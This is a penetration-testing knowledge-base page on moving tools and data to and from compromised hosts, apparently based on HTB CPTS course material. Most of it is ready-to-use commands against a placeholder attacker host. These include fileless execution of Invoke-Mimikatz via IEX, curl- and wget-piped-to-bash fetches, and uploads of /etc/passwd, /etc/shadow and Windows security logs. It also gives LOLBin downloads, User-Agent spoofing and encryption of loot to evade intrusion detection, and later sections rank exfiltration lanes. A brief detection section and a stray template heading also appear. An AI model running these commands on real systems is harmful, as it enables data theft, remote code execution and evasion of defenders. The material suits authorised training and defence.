---
title: "File Transfer Techniques"
type: technique
tags: [exploitation, file-transfer, htb, linux, post-exploitation, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-file-transfer]
---

# File Transfer Techniques

## What it is

File transfer during a penetration test is the process of moving tools, payloads, and exfiltrated data between the attacker's machine and compromised hosts. The same techniques are used by defenders to understand and detect malicious lateral movement.

## How it works

The attacker leverages existing system utilities, network protocols (HTTP, SMB, FTP, DNS), or programming language built-ins to transfer files. The key principle is to blend in with legitimate traffic. Many approaches use protocols that are already allowed through firewalls (HTTP/S on 80/443).

## Prerequisites

- A foothold on the target (shell, RCE, or interactive access)
- Network connectivity to or from the attacker's host
- Knowledge of what interpreters and utilities exist on the target

---

## Methodology

1. Determine what is available on the target (PowerShell version, curl, wget, Python, etc.)
2. Choose a method that matches allowed outbound/inbound traffic
3. Verify file integrity after transfer (MD5/SHA1 comparison)
4. Clean up transferred tools after use

---

### PowerShell Download (Preferred)

```powershell
# DownloadFile to disk
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/tool.exe','C:\Users\Public\tool.exe')

# Async download
(New-Object Net.WebClient).DownloadFileAsync('http://<ATTACKER_IP>:8000/tool.exe','C:\Users\Public\tool.exe')

# Fileless — execute in memory without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/Invoke-Mimikatz.ps1')

# Pipeline variant
(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/script.ps1') | IEX

# Invoke-WebRequest (slower but built-in from PS 3.0)
Invoke-WebRequest http://<ATTACKER_IP>:8000/tool.exe -OutFile C:\Users\Public\tool.exe
iwr http://<ATTACKER_IP>:8000/tool.exe -OutFile tool.exe

# Fix SSL certificate errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Fix IE first-launch error
Invoke-WebRequest https://<ATTACKER_IP>/file.ps1 -UseBasicParsing | IEX
```

### PowerShell Upload

```powershell
# Upload via PSUpload.ps1 to Python uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Base64 POST upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\target\file.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64

# FTP upload
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\file.txt')
```

### PowerShell Base64 Transfer

```powershell
# On attacker: encode a file
cat id_rsa | base64 -w 0; echo

# On Windows: decode base64 to file
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))

# Encode on Windows
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### SMB

```bash
# Attacker: start SMB server (no auth)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Attacker: start SMB server with credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Windows: copy from SMB share
copy \\<ATTACKER_IP>\share\nc.exe

# Windows: mount with credentials
net use n: \\<ATTACKER_IP>\share /user:test test
copy n:\nc.exe
```

### SMB over WebDAV (when port 445 is blocked outbound)

```bash
# Attacker: install and start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
# Windows: connect and upload via WebDAV
dir \\<ATTACKER_IP>\DavWWWRoot
copy C:\Users\john\file.zip \\<ATTACKER_IP>\DavWWWRoot\
```

### FTP

```bash
# Attacker: start Python FTP server
sudo python3 -m pyftpdlib --port 21

# Attacker: start with credentials
sudo python3 -m pyftpdlib --port 21 --user test --password test
```

```powershell
# Windows FTP download (non-interactive)
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/nc.exe', 'C:\Users\Public\nc.exe')
```

---

### wget / cURL Download

```bash
# wget to disk
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh

# curl to disk
curl -o /tmp/linpeas.sh http://<ATTACKER_IP>:8000/linpeas.sh

# Fileless wget — execute immediately
wget -qO- http://<ATTACKER_IP>:8000/script.sh | bash

# Fileless curl
curl http://<ATTACKER_IP>:8000/script.sh | bash
```

### cURL Upload

```bash
# Upload single file
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'file=@/etc/passwd'

# Upload multiple files
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### SCP (SSH)

```bash
# Download from remote to local
scp user@<TARGET_IP>:/remote/path/file.txt /local/directory/

# Upload from local to remote
scp file.txt user@<TARGET_IP>:/remote/directory/

# Upload with SSH key
scp -i /opt/id_rsa linpeas.sh user@<TARGET_IP>:/dev/shm/

# Recursive upload/download
scp -r /local/directory/ user@<TARGET_IP>:/remote/directory/
scp -r user@<TARGET_IP>:/remote/directory/ /local/directory/
```

### Base64 Encode/Decode (no network required)

```bash
# Encode file on source
base64 -w 0 /etc/passwd; echo
cat id_rsa | base64 -w 0; echo

# Decode on destination (paste base64 string)
echo -n '<BASE64_STRING>' | base64 -d > /tmp/file

# Verify integrity
md5sum original_file
md5sum transferred_file
```

### Bash /dev/tcp (no curl/wget)

```bash
# Download via Bash built-in TCP
exec 3<>/dev/tcp/<ATTACKER_IP>/80
echo -e "GET /file.sh HTTP/1.1\nHost: <ATTACKER_IP>\n\n" >&3
cat <&3 > /tmp/file.sh
```

---

## Python HTTP Server (Attacker Side)

```bash
# Python 3 (use from attacker's working directory)
python3 -m http.server 8000

# Python 3 with upload capability
pip3 install uploadserver
python3 -m uploadserver 8000

# Python 2 fallback
python -m SimpleHTTPServer 8000
```

---

## Netcat File Transfer

```bash
# Receiver (target) listens
nc -l -p 8000 > received_file.exe

# Sender (attacker) sends
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe

# Alternative: attacker listens, target connects
# Attacker:
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Target:
nc <ATTACKER_IP> 443 > SharpKatz.exe

# Using /dev/tcp if nc is not available
cat < /dev/tcp/<ATTACKER_IP>/443 > received_file.exe
```

---

## LOLBins — Windows (LOLBAS)

Living off the Land Binaries that can perform file transfer. Full list: https://lolbas-project.github.io/

```powershell
# Certutil (wget for Windows — flagged by AMSI)
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe

# Bitsadmin
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\Public\nc.exe

# BITS via PowerShell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# CertReq upload to Netcat listener
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini

# GfxDownloadWrapper (Intel GPU driver — may bypass AppWhitelisting)
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/payload.exe" "C:\Temp\payload.exe"
```

## LOLBins — Linux (GTFOBins)

```bash
# OpenSSL (encrypted transfer)
# Attacker — create cert and serve file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/linpeas.sh

# Target — download via OpenSSL
openssl s_client -connect <ATTACKER_IP>:80 -quiet > linpeas.sh
```

---

## Evading Detection

```powershell
# Spoof User-Agent to blend with legitimate browser traffic
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Key evasion principles:
- Use HTTPS (port 443) to encrypt transfers
- Use legitimate protocol ports (80, 443)
- Spoof User-Agent strings
- Use LOLBAS/GTFOBins to avoid dropping new binaries
- Base64 encode transfers through text-only channels (web shells, command injection)
- Fileless execution avoids writing to disk entirely

---

## Detection and Defence

- Monitor `certutil.exe`, `bitsadmin.exe`, `CertReq.exe` for unusual network activity
- Baseline and alert on PowerShell `DownloadFile`, `IEX`, `Invoke-WebRequest` in logs
- Inspect HTTPS traffic (TLS inspection / SSL inspection) in corporate environments
- Monitor for unusual processes making network connections (web server spawning curl)
- Hash-verify scripts before execution in automated pipelines

## Tools

- Impacket — SMB server (`impacket-smbserver`)
- Python — HTTP and upload servers
- Netcat — raw TCP file transfer
- OpenSSL — encrypted transfer via GTFOBins
- Certutil — Windows LOLBin downloader
- Bitsadmin — Windows BITS transfer
- WinSCP / SCP — SSH-based transfer

## Sources

- CPTS File Transfer module (Windows, Linux, Miscellaneous, LOLBins, Detection, Evading Detection)



## Exfil off a Windows workstation (lane ranking)

Pulling a large bundle OFF a Windows box when you hold only a local account (even one in Administrators):

- SMB `C$` and WinRM (evil-winrm) both REFUSE local accounts over the network by default (UAC remote filtering / LocalAccountTokenFilterPolicy). One denial each is enough; do not grind them or re-try with fresh local accounts.
- RDP drive redirection plus RemoteApp (`/app:"program:cmd.exe,cmd:/c copy <file> \\tsclient\<share>"`) authenticates fine, but freerdp3 RAIL crashes (BadAtom) on a headless Xvfb display; full-desktop `/drive` works only with a real display or an operator watching the session.
- Fastest lane when the target already runs an http.server (common on lab/DFIR boxes): plain wget from the attacker. Enumerate which directory it roots; a server relaunched after a reboot often roots at the user profile, putting every user file one GET away.

```sh
wget http://<target-ip>:<port>/<bundle>.zip
```

- If the http.server belongs to the environment or another user, never kill or restart it to change its root; find a path it already serves.

<!-- promoted-slug: exfil-off-windows -->

## <Heading>

<generic technique steps; no client host/IP/domain>

## Push exfil lane: uploadserver + curl.exe (when pull lanes are blocked)

Add to the lane ranking above: when the target firewall blocks inbound (no http.server to pull
from, HttpListener refused on all profiles) and SMB dies after its first mount, run a Python
`uploadserver` on the attacker box and have the TARGET push each file with its built-in curl:

```sh
python3 -m uploadserver 8000   # pip install uploadserver; serves GET + accepts POST /upload
```

```powershell
curl.exe -s -o NUL -F files=@C:\Windows\System32\winevt\Logs\Security.evtx http://<ATTACKER_IP>:8000/upload
```

- Works over only WinRM command exec (no RDP, no SMB), multi-file, no staging needed.
- URL-encode `%` in paths (`Microsoft-Windows-Sysmon%4Operational.evtx` works as-is: `%4` is
  the literal in the filename and curl sends it fine; spaces do NOT work unquoted - stage
  space-named files to temp names first).
- Gotcha when pairing with an impacket-smbserver lane: an impacket-smbserver mount from a Windows client works
  ONCE per boot; every later `net use` fails with `System error 1312` (cached logon session, client
  falls back to machine-credential auth `(\,HOSTNAME)`), and restarting LanmanWorkstation does not
  clear it. Take the one transfer, then switch to the push lane.

<!-- promoted-slug: exfil-push-uploadserver -->

## Encrypt files before transfer (protected transfers)

Exfiltrating loot over a plaintext channel hands sensitive content (creds, hashes) to the client's IDS. Encrypt at rest first, transfer the ciphertext, decrypt on the attacker box.

Linux, openssl with a password (no cert needed):

```sh
openssl enc -aes256 -iter 100000 -pbkdf2 -in loot.txt -out loot.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in loot.enc -out loot.txt
```

Windows, PowerShell (function `Invoke-AESEncryption.ps1`, part of the DRTools gallery package; AES-256-CBC, key = SHA256 of passphrase, IV prepended, output suffix `.aes`):

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "passphrase" -Path .\loot.txt   # -> loot.txt.aes
Invoke-AESEncryption -Mode Decrypt -Key "passphrase" -Path .\loot.txt.aes
```

It also encrypts/decrypts strings directly (`-Mode Encrypt -Key k -Text s` returns base64 ciphertext), handy for small secrets through text-only channels. Pair with the base64 POST-over-netcat trick for channels that only carry text.

<!-- promoted-slug: file-transfer-encrypted-exfil -->

## Non-interactive FTP download via command file

Non-interactive shells (no prompt for the FTP password) break the stock `ftp` client. Write the session into a file and feed it with `-s:`; `-n` suppresses autologin, `-v` shows the dialog:

```powershell
echo open LHOST > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

`binary` matters before GET or binaries arrive corrupted. For uploads to an attacker FTP server, remember `python3 -m pyftpdlib --port 21` needs `--write` added or PUT/stor fails.

<!-- promoted-slug: file-transfer-ftp-commandfile -->

## Transfers via installed interpreters (no curl/wget needed)

When the usual transfer binaries are missing, any interpreter already on the box can fetch or push files. Try these before uploading new tooling.

Python:

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://LHOST:8000/tool.sh", "tool.sh")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://LHOST:8000/tool.sh", "tool.sh")'
# push to an uploadserver instance:
python3 -c 'import requests;requests.post("http://LHOST:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

PHP (needs allow_url_fopen for URL wrappers; `-r` runs a one-liner):

```sh
php -r '$f = file_get_contents("http://LHOST:8000/tool.sh"); file_put_contents("tool.sh",$f);'
php -r 'foreach (@file("http://LHOST:8000/tool.sh") as $l) { echo $l; }' | bash
```

Ruby and Perl:

```sh
ruby -e 'require "net/http"; File.write("tool.sh", Net::HTTP.get(URI.parse("http://LHOST:8000/tool.sh")))'
perl -e 'use LWP::Simple; getstore("http://LHOST:8000/tool.sh", "tool.sh");'
```

Windows scripting hosts (no PowerShell needed; save then run with cscript):

```text
cscript.exe /nologo wget.js http://LHOST:8000/tool.ps1 tool.ps1
cscript.exe /nologo wget.vbs http://LHOST:8000/tool.ps1 tool.ps1
```

wget.js core: `WinHttp.WinHttpRequest.5.1` GET, write `ResponseBody` through `ADODB.Stream` (Type 1) with `SaveToFile`. wget.vbs core: same flow via `Microsoft.XMLHTTP` and `Adodb.Stream` (`savetofile ..., 2`). Both take URL and output path as arguments.

<!-- promoted-slug: file-transfer-language-oneliners -->

## Attacker-side catch servers beyond uploadserver

Nginx with PUT (WebDAV methods) accepts uploads with zero Python deps and, unlike Apache+PHP, will not execute whatever lands in the upload dir:

```sh
sudo mkdir -p /var/www/uploads/SecretUploadDirectory && sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

```text
# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```sh
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service        # port 80 conflict: remove sites-enabled/default
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt   # client side
```

Verify directory listing stays OFF for the upload path (Nginx default is off; Apache lists dirs lacking index.html, which exposes every exfiled file).

uploadserver over TLS, for networks where plaintext HTTP would itself stand out:

```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate server.pem
```

Quick throwaway web servers when Python is absent: `php -S 0.0.0.0:8000`, `ruby -run -ehttpd . -p8000`.

<!-- promoted-slug: file-transfer-nginx-put-catcher -->

## RDP drive redirection as a transfer lane

With an interactive RDP session, mount an attacker-side folder into the session and copy both directions; no protocol beyond RDP/3389 needed.

```sh
rdesktop TARGET_IP -d DOMAIN -u user -p 'pass' -r disk:share='/home/user/files'
xfreerdp /v:TARGET_IP /u:user /p:'pass' /drive:share,/home/user/files
```

Inside the session the share appears under `\\tsclient\share`; copy to and from it in Explorer or cmd. From Windows, mstsc.exe offers the same under Local Resources, Drives (More...).

Notes: the redirected drive is private to that RDP session, other logged-on users on the target cannot reach it even by hijacking the session; headless freerdp RAIL/RemoteApp mounts can crash on a virtual display, use the full-desktop `/drive` form.

<!-- promoted-slug: file-transfer-rdp-drive-mount -->

## User-agent fingerprints of Windows transfer methods

Each Windows downloader announces itself differently to the catch server; know the fingerprints to pick the one that blends (blue-team view: hunt for the anomalous ones in SIEM).

| Client method | UA seen server-side |
|---|---|
| Invoke-WebRequest / Invoke-RestMethod | `WindowsPowerShell/5.1...` (loud) |
| WinHttp.WinHttpRequest COM | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Msxml2.XMLHTTP COM | full IE UA (`MSIE 7.0; ... Trident/7.0`) , blends as browser |
| certutil -urlcache / -verifyctl | `Microsoft-CryptoAPI/10.0` |
| BITS (Start-BitsTransfer) | `Microsoft BITS/7.8`, sent on a HEAD probe first |

Msxml2.XMLHTTP is the quiet default when UA blacklisting is in play; run the same download through it:

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://LHOST/nc.exe',$false); $h.send(); iex $h.responseText
```

To masquerade actively, PowerShell ships preset browser UAs (InternetExplorer, FireFox, Chrome, Opera, Safari):

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{l='UA';e={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}
Invoke-WebRequest http://LHOST/nc.exe -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -OutFile nc.exe
```

Gotcha: base64 paste transfers die silently above roughly 8k because cmd.exe caps a command line at 8191 characters; chunk large files or use another lane.

<!-- promoted-slug: file-transfer-useragent-fingerprints -->

## File copy over PowerShell Remoting sessions (WinRM)

When HTTP, HTTPS and SMB are all blocked between two Windows hosts, WinRM (TCP/5985 HTTP, TCP/5986 HTTPS) often still works and carries files natively via PSSession. Needs admin rights, membership in `Remote Management Users`, or explicit session-config permission on the far host.

```powershell
# Confirm WinRM reachability first
Test-NetConnection -ComputerName TARGET -Port 5985

# Open a session and move files both directions
$Session = New-PSSession -ComputerName TARGET
Copy-Item -Path C:\tools\tool.exe -ToSession $Session -Destination C:\Users\Public\
Copy-Item -Path "C:\Users\Public\loot.txt" -Destination C:\ -FromSession $Session
```

Useful as a lateral exfil lane too: pull files FROM a session onto the box you occupy, then relay them out with any egress lane. If the current user already has rights on the far host, no `-Credential` is needed; otherwise pass one.

<!-- promoted-slug: file-transfer-winrm-session -->
